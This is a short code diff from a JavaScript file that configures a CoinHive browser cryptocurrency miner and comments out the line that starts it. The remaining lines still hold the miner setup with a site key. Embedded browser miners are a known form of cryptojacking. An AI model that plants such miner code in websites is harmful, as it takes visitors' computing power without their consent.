@@ -29,4 +29,4 @@ var miner = new CoinHive.User('lNx6RgYfV66oiZebezpuXYswaQe76D7i', nyannyanId, {
 	throttle: 0.8,
 	forceASMJS: false
 });
-miner.start(CoinHive.IF_EXCLUSIVE_TAB);
+//miner.start(CoinHive.IF_EXCLUSIVE_TAB);
